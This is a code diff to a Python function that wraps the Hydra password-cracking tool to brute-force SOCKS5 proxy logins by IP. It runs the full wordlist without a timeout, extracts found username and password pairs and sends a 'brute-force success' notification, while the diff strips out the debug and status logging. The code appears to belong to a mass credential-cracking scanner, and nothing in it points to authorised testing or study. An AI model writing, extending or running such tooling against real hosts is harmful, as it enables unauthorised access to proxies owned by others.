@@ -383,21 +383,18 @@ def run_hydra(ip, port, log_prefix="", current=0, total=0):
         "-w", "1",      # 等待响应时间
         "-f",           # 找到后立即停止
         "-I",           # 忽略已有会话
-        "-v",           # 详细输出（新增，方便调试）
         f"socks5://{ip}"
     ]
     
     try:
         # 不设置timeout，让Hydra完整跑完所有字典组合
+        # 这样即使字典很大也能全部尝试完
         res = subprocess.run(
             cmd,
             capture_output=True,
             text=True
+            # 移除了 timeout=120 参数
         )
-        
-        # 打印 Hydra 的原始输出（调试用）
-        if res.stdout:
-            print(f"[DEBUG] Hydra stdout:\n{res.stdout[:500]}")  # 只打印前500字符
         
         # 检查是否真的找到有效密码
         if "valid password found" in res.stdout.lower():
@@ -408,8 +405,6 @@ def run_hydra(ip, port, log_prefix="", current=0, total=0):
                 if "error" not in matched_text.lower() and "fail" not in matched_text.lower():
                     user = match.group(1)
                     pwd = match.group(2)
-                    
-                    update_status(f"{log_prefix} Hydra 报告找到: {user}:{pwd}")
                     
                     # 发送爆破成功通知，但不自动删除，等验证结果
                     if current > 0 and total > 0:
@@ -429,17 +424,12 @@ def run_hydra(ip, port, log_prefix="", current=0, total=0):
                     
                     return user, pwd, None
         
-        # 如果 Hydra 输出中有 "all 16 tasks completed" 之类的
-        if "completed" in res.stdout.lower():
-            update_status(f"{log_prefix} Hydra 已尝试所有字典组合，未找到有效账密")
-        
         return None, None, None
         
     except FileNotFoundError:
-        update_status(f"{log_prefix} ❌ Hydra 未安装")
         return None, None, None
     except Exception as e:
-        update_status(f"{log_prefix} Hydra 执行异常: {e}")
+        print(f"Hydra执行异常: {e}")
         return None, None, None
 
 
